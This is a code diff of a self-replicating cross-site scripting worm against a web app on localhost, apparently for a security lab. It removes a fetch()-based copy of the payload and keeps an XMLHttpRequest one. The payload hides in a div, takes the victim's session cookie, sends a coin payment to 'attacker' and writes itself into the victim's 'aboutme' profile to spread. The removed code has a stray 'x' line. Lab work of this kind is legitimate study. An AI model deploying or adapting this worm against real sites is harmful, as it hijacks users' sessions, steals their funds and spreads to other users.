@@ -1,4 +1,3 @@
-// using XMLHttpRequest()
 <div id="lolololololol" hidden>
     <script>
         const stealCoin = new FormData();
@@ -17,32 +16,5 @@
         const aboutmeRequest = new XMLHttpRequest();
         aboutmeRequest.open("POST", "http://localhost:8080/aboutme");
         aboutmeRequest.send(spreadWorm);
-    </script> 
-</div>
-
-
-
-// using fetch()
-<div id="lolololololol" hidden>
-    <script>
-        const stealCoin = new FormData();
-        stealCoin.append('recipient', 'attacker');
-        stealCoin.append('amount', 1);
-        stealCoin.append('session_token', document.cookie.split("session=")[1].split(";")[0]);
-    
-        fetch("http://localhost:8080/pay",
-            {
-                body: stealCoin,
-                method: "post"
-            });
-    x
-        const replicationScript = document.getElementById("lolololololol");
-        const spreadWorm = new FormData();
-        spreadWorm.append('aboutme', replicationScript.outerHTML);
-        fetch("http://localhost:8080/aboutme",
-            {
-                body: spreadWorm,
-                method: "post"
-            });
     </script> 
 </div>
